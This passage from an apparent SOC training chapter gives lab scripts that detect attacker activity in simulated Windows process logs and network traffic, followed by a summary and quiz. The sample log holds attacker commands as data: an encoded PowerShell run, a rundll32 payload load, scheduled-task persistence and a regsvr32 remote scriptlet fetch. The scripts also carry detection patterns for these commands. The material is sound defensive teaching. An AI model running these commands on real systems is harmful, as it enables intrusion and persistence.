       {"timestamp": "2023-01-15T08:15:12", "process": "word.exe", "parent": "explorer.exe", "user": "user1", "command_line": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"},
       {"timestamp": "2023-01-15T09:23:05", "process": "powershell.exe", "parent": "explorer.exe", "user": "user1", "command_line": "powershell.exe"},
       {"timestamp": "2023-01-15T09:23:18", "process": "cmd.exe", "parent": "powershell.exe", "user": "user1", "command_line": "cmd.exe /c dir"},
       {"timestamp": "2023-01-15T09:24:02", "process": "net.exe", "parent": "cmd.exe", "user": "user1", "command_line": "net user administrator /domain"},
       {"timestamp": "2023-01-15T09:24:35", "process": "net.exe", "parent": "cmd.exe", "user": "user1", "command_line": "net group \"Domain Admins\" /domain"},
       {"timestamp": "2023-01-15T09:25:12", "process": "powershell.exe", "parent": "cmd.exe", "user": "user1", "command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="},
       {"timestamp": "2023-01-15T09:26:03", "process": "rundll32.exe", "parent": "powershell.exe", "user": "user1", "command_line": "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllMain"},
       {"timestamp": "2023-01-15T09:27:45", "process": "schtasks.exe", "parent": "cmd.exe", "user": "user1", "command_line": "schtasks /create /tn \"SystemUpdate\" /tr \"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=\" /sc daily /st 12:00"},
       {"timestamp": "2023-01-15T09:30:22", "process": "regsvr32.exe", "parent": "cmd.exe", "user": "user1", "command_line": "regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll"},
       {"timestamp": "2023-01-15T10:15:33", "process": "outlook.exe", "parent": "explorer.exe", "user": "user1", "command_line": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"},
       {"timestamp": "2023-01-15T11:42:15", "process": "excel.exe", "parent": "explorer.exe", "user": "user1", "command_line": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"},
       {"timestamp": "2023-01-15T13:05:27", "process": "chrome.exe", "parent": "explorer.exe", "user": "user1", "command_line": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
       {"timestamp": "2023-01-15T14:22:18", "process": "powershell.exe", "parent": "explorer.exe", "user": "user1", "command_line": "powershell.exe"},
       {"timestamp": "2023-01-15T14:23:05", "process": "notepad.exe", "parent": "explorer.exe", "user": "user1", "command_line": "notepad.exe C:\\Users\\user1\\Documents\\notes.txt"}
   ]
   
   # Simulated normal baseline data
   normal_baseline = {
       "process_frequency": {
           "explorer.exe": 1,
           "chrome.exe": 10,
           "word.exe": 5,
           "excel.exe": 4,
           "outlook.exe": 6,
           "powershell.exe": 2,
           "cmd.exe": 1,
           "notepad.exe": 3
       },
       "parent_child_relationships": {
           "explorer.exe": ["chrome.exe", "word.exe", "excel.exe", "outlook.exe", "powershell.exe", "notepad.exe"],
           "powershell.exe": [],
           "cmd.exe": []
       },
       "command_line_patterns": {
           "powershell.exe": ["powershell.exe"],
           "cmd.exe": ["cmd.exe /c dir"]
       }
   }
   
   def analyze_process_behavior(data, baseline):
       print("[+] Performing behavioral analysis on process data")
       
       # Process frequency analysis
       process_counts = defaultdict(int)
       for entry in data:
           process_counts[entry["process"]] += 1
       
       print("\n[+] Process Frequency Analysis:")
       for process, count in process_counts.items():
           baseline_count = baseline["process_frequency"].get(process, 0)
           if count > baseline_count * 2:  # Simple anomaly detection
               print(f"    [!] Unusual frequency for {process}: {count} occurrences (baseline: {baseline_count})")
           else:
               print(f"    [-] Normal frequency for {process}: {count} occurrences")
       
       # Parent-child relationship analysis
       parent_child = defaultdict(list)
       for entry in data:
           parent_child[entry["parent"]].append(entry["process"])
       
       print("\n[+] Parent-Child Relationship Analysis:")
       for parent, children in parent_child.items():
           baseline_children = baseline["parent_child_relationships"].get(parent, [])
           unusual_children = [child for child in set(children) if child not in baseline_children]
           if unusual_children:
               print(f"    [!] Unusual children for {parent}: {unusual_children}")
           else:
               print(f"    [-] Normal parent-child relationships for {parent}")
       
       # Command line analysis
       command_lines = defaultdict(list)
       for entry in data:
           command_lines[entry["process"]].append(entry["command_line"])
       
       print("\n[+] Command Line Analysis:")
       for process, cmds in command_lines.items():
           baseline_cmds = baseline["command_line_patterns"].get(process, [])
           unusual_cmds = []
           for cmd in cmds:
               is_normal = False
               for baseline_cmd in baseline_cmds:
                   if baseline_cmd in cmd:
                       is_normal = True
                       break
               if not is_normal and "-enc" in cmd or "/create" in cmd:
                   unusual_cmds.append(cmd)
           
           if unusual_cmds:
               print(f"    [!] Unusual command lines for {process}:")
               for cmd in unusual_cmds:
                   print(f"        - {cmd}")
       
       # Process execution timeline
       print("\n[+] Creating process execution timeline visualization")
       processes = list(set([entry["process"] for entry in data]))
       timestamps = [datetime.datetime.fromisoformat(entry["timestamp"]) for entry in data]
       process_indices = [processes.index(entry["process"]) for entry in data]
       
       plt.figure(figsize=(12, 6))
       plt.scatter(timestamps, process_indices, marker='o')
       plt.yticks(range(len(processes)), processes)
       plt.xlabel('Time')
       plt.ylabel('Process')
       plt.title('Process Execution Timeline')
       plt.grid(True, axis='y')
       plt.tight_layout()
       plt.savefig('process_timeline.png')
       print("    Timeline saved as 'process_timeline.png'")
       
       # Identify potential attack patterns
       print("\n[+] Attack Pattern Analysis:")
       
       # Check for discovery activities
       discovery_cmds = [entry for entry in data if "net user" in entry["command_line"] or "net group" in entry["command_line"]]
       if discovery_cmds:
           print("    [!] Potential discovery activities detected:")
           for cmd in discovery_cmds:
               print(f"        - {cmd['timestamp']}: {cmd['command_line']}")
       
       # Check for persistence mechanisms
       persistence_cmds = [entry for entry in data if "schtasks /create" in entry["command_line"] or "reg add" in entry["command_line"]]
       if persistence_cmds:
           print("    [!] Potential persistence mechanisms detected:")
           for cmd in persistence_cmds:
               print(f"        - {cmd['timestamp']}: {cmd['command_line']}")
       
       # Check for suspicious execution chains
       if any(entry["parent"] == "powershell.exe" and entry["process"] == "rundll32.exe" for entry in data):
           print("    [!] Suspicious execution chain detected: powershell.exe -> rundll32.exe")
       
       # Check for encoded commands
       encoded_cmds = [entry for entry in data if "-enc" in entry["command_line"]]
       if encoded_cmds:
           print("    [!] Encoded commands detected:")
           for cmd in encoded_cmds:
               print(f"        - {cmd['timestamp']}: {cmd['command_line']}")
   
   if __name__ == "__main__":
       analyze_process_behavior(process_data, normal_baseline)
   EOF
   
   chmod +x behavioral_analysis.py
   ```

2. **Run the behavioral analysis**
   ```bash
   python3 behavioral_analysis.py
   ```

### Step 5: Network Traffic Analysis for APT Detection

1. **Create a script to analyze network traffic for APT indicators**
   ```bash
   cat > network_analysis.py << 'EOF'
   #!/usr/bin/env python3
   import json
   import datetime
   import matplotlib.pyplot as plt
   import numpy as np
   from collections import defaultdict
   
   # Simulated network traffic data
   network_data = [
       {"timestamp": "2023-01-15T08:05:23", "src_ip": "192.168.1.100", "dst_ip": "172.217.20.110", "dst_port": 443, "protocol": "TCP", "bytes": 1420, "domain": "google.com"},
       {"timestamp": "2023-01-15T08:15:45", "src_ip": "192.168.1.100", "dst_ip": "13.107.42.16", "dst_port": 443, "protocol": "TCP", "bytes": 8750, "domain": "microsoft.com"},
       {"timestamp": "2023-01-15T08:30:12", "src_ip": "192.168.1.100", "dst_ip": "23.23.212.222", "dst_port": 443, "protocol": "TCP", "bytes": 3240, "domain": "amazon.com"},
       {"timestamp": "2023-01-15T09:25:18", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 568, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:25:48", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 450, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:26:18", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 450, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:26:48", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 450, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:27:18", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 450, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:27:48", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 450, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T09:30:22", "src_ip": "192.168.1.100", "dst_ip": "104.18.21.52", "dst_port": 443, "protocol": "TCP", "bytes": 1250, "domain": "example.com"},
       {"timestamp": "2023-01-15T09:45:33", "src_ip": "192.168.1.100", "dst_ip": "192.168.1.5", "dst_port": 445, "protocol": "TCP", "bytes": 4350, "domain": ""},
       {"timestamp": "2023-01-15T09:46:15", "src_ip": "192.168.1.100", "dst_ip": "192.168.1.10", "dst_port": 445, "protocol": "TCP", "bytes": 3720, "domain": ""},
       {"timestamp": "2023-01-15T09:47:22", "src_ip": "192.168.1.100", "dst_ip": "192.168.1.15", "dst_port": 445, "protocol": "TCP", "bytes": 3890, "domain": ""},
       {"timestamp": "2023-01-15T09:48:05", "src_ip": "192.168.1.100", "dst_ip": "192.168.1.20", "dst_port": 445, "protocol": "TCP", "bytes": 4120, "domain": ""},
       {"timestamp": "2023-01-15T10:15:27", "src_ip": "192.168.1.100", "dst_ip": "192.168.1.25", "dst_port": 3389, "protocol": "TCP", "bytes": 8750, "domain": ""},
       {"timestamp": "2023-01-15T11:05:18", "src_ip": "192.168.1.100", "dst_ip": "45.77.65.211", "dst_port": 443, "protocol": "TCP", "bytes": 15240, "domain": "d1zbsb97rav3lo.cloudfront.net"},
       {"timestamp": "2023-01-15T13:22:45", "src_ip": "192.168.1.100", "dst_ip": "172.217.20.110", "dst_port": 443, "protocol": "TCP", "bytes": 2340, "domain": "google.com"}
   ]
   
   def analyze_network_traffic(data):
       print("[+] Performing network traffic analysis for APT detection")
       
       # Connection frequency analysis
       connections = defaultdict(int)
       for entry in data:
           connections[(entry["src_ip"], entry["dst_ip"], entry["dst_port"])] += 1
       
       print("\n[+] Connection Frequency Analysis:")
       for conn, count in connections.items():
           src_ip, dst_ip, dst_port = conn
           if count > 5:
               print(f"    [!] High frequency connection: {src_ip} -> {dst_ip}:{dst_port} ({count} occurrences)")
       
       # Beaconing detection
       print("\n[+] Beaconing Detection:")
       beaconing_candidates = defaultdict(list)
       for entry in data:
           key = (entry["src_ip"], entry["dst_ip"], entry["dst_port"])
           beaconing_candidates[key].append(datetime.datetime.fromisoformat(entry["timestamp"]))
       
       for conn, timestamps in beaconing_candidates.items():
           if len(timestamps) < 3:
               continue
               
           # Calculate time differences between consecutive connections
           time_diffs = []
           for i in range(1, len(timestamps)):
               diff_seconds = (timestamps[i] - timestamps[i-1]).total_seconds()
               time_diffs.append(diff_seconds)
           
           # Check for consistent timing (beaconing)
           if len(time_diffs) >= 2:
               avg_diff = sum(time_diffs) / len(time_diffs)
               std_diff = np.std(time_diffs)
               
               # If standard deviation is low, timing is consistent
               if std_diff < avg_diff * 0.1 and len(timestamps) >= 4:
                   src_ip, dst_ip, dst_port = conn
                   print(f"    [!] Potential beaconing detected: {src_ip} -> {dst_ip}:{dst_port}")
                   print(f"        Interval: ~{avg_diff:.1f} seconds, Consistency: {std_diff:.1f}")
                   print(f"        Occurrences: {len(timestamps)}")
       
       # Internal reconnaissance detection
       print("\n[+] Internal Reconnaissance Detection:")
       internal_scans = defaultdict(list)
       for entry in data:
           if entry["dst_ip"].startswith("192.168.") and entry["dst_port"] in [445, 139, 135, 22, 3389]:
               internal_scans[entry["src_ip"]].append(entry["dst_ip"])
       
       for src_ip, targets in internal_scans.items():
           if len(set(targets)) >= 3:
               print(f"    [!] Potential internal scanning from {src_ip} to {len(set(targets))} internal hosts")
               print(f"        Target ports: {', '.join(str(entry['dst_port']) for entry in data if entry['src_ip'] == src_ip and entry['dst_ip'] in targets)}")
       
       # Data exfiltration detection
       print("\n[+] Data Exfiltration Detection:")
       outbound_data = defaultdict(int)
       for entry in data:
           if not entry["dst_ip"].startswith("192.168."):
               outbound_data[(entry["src_ip"], entry["dst_ip"], entry["domain"])] += entry["bytes"]
       
       for conn, bytes_sent in outbound_data.items():
           src_ip, dst_ip, domain = conn
           if bytes_sent > 10000:
               print(f"    [!] Large data transfer: {src_ip} -> {dst_ip} ({domain}): {bytes_sent} bytes")
       
       # Domain analysis
       print("\n[+] Domain Analysis:")
       domains = defaultdict(int)
       for entry in data:
           if entry["domain"]:
               domains[entry["domain"]] += 1
       
       for domain, count in domains.items():
           # Check for potential DGA domains
           if len(domain) > 20 and "." in domain and domain.count(".") <= 2:
               print(f"    [!] Potential algorithmically generated domain: {domain} ({count} occurrences)")
       
       # Visualize network connections
       print("\n[+] Creating network traffic visualization")
       
       # Prepare data for visualization
       timestamps = [datetime.datetime.fromisoformat(entry["timestamp"]) for entry in data]
       destinations = list(set([entry["dst_ip"] for entry in data]))
       dst_indices = [destinations.index(entry["dst_ip"]) for entry in data]
       bytes_values = [entry["bytes"] for entry in data]
       
       plt.figure(figsize=(12, 6))
       plt.scatter(timestamps, dst_indices, s=[b/50 for b in bytes_values], alpha=0.7)
       plt.yticks(range(len(destinations)), destinations)
       plt.xlabel('Time')
       plt.ylabel('Destination IP')
       plt.title('Network Traffic Analysis')
       plt.grid(True, axis='y')
       plt.tight_layout()
       plt.savefig('network_traffic.png')
       print("    Visualization saved as 'network_traffic.png'")
   
   if __name__ == "__main__":
       analyze_network_traffic(network_data)
   EOF
   
   chmod +x network_analysis.py
   ```

2. **Run the network analysis**
   ```bash
   python3 network_analysis.py
   ```

### Lab Conclusion

In this lab, you have:
1. Implemented detection rules based on the MITRE ATT&CK framework
2. Created and tested YARA rules for identifying malicious patterns
3. Applied behavioral analysis techniques to process execution data
4. Detected simulated APT activities through network traffic analysis
5. Visualized process execution timelines and network connections

These techniques form the foundation of advanced threat detection capabilities in a SOC environment. By combining signature-based detection, behavioral analysis, and threat intelligence, you can build a robust defense against sophisticated threats.

## Chapter Summary

In this chapter, we explored advanced threat detection and analysis methodologies essential for modern SOC operations. We covered:

- Attack methodologies and kill chain models for understanding threat progression
- Implementation of the MITRE ATT&CK framework for comprehensive threat detection
- Working with Indicators of Compromise (IoCs) for identifying known threats
- Behavioral analysis techniques for detecting anomalous activity
- Advanced Persistent Threat (APT) detection strategies
- Network traffic analysis for identifying malicious communications

These techniques provide SOC analysts with the tools and methodologies needed to detect sophisticated threats that might evade traditional security controls. By combining multiple detection approaches and understanding attacker methodologies, security teams can build more effective defense mechanisms and respond more quickly to emerging threats.

## Knowledge Check

1. What are the key differences between the Cyber Kill Chain and the MITRE ATT&CK framework?
2. Name three types of Indicators of Compromise and explain their strengths and limitations.
3. How does behavioral analysis differ from signature-based detection, and what advantages does it offer?
4. What are the defining characteristics of Advanced Persistent Threats (APTs)?
5. Explain how the MITRE ATT&CK framework can be implemented in SOC operations.
6. What network traffic patterns might indicate command and control (C2) communication?
7. How can process behavior monitoring help detect fileless malware?
8. What are the challenges in detecting encrypted malicious traffic?
9. Explain the concept of "living off the land" and why it makes detection challenging.
10. How can threat intelligence be integrated into detection strategies to improve effectiveness?

## Additional Resources

### Books
- "The Art of Memory Forensics" by Michael Hale Ligh, Andrew Case, Jamie Levy, and AAron Walters
- "Applied Network Security Monitoring" by Chris Sanders and Jason Smith
- "Intelligence-Driven Incident Response" by Scott J. Roberts and Rebekah Brown

### Online Resources
- MITRE ATT&CK Framework: [https://attack.mitre.org/](https://attack.mitre.org/)
- SANS Reading Room: [Threat Hunting](https://www.sans.org/reading-room/whitepapers/detection/)
- YARA Rules Repository: [https://github.com/Yara-Rules/rules](https://github.com/Yara-Rules/rules)

### Training and Certification
- SANS FOR508: Advanced Digital Forensics, Incident Response, and Threat Hunting
- SANS SEC555: SIEM with Tactical Analytics
- Certified Threat Intelligence Analyst (CTIA)

## Next Steps
In the next chapter, we will explore incident response procedures in the SOC, including creating effective playbooks, incident classification, containment strategies, and forensic analysis techniques.
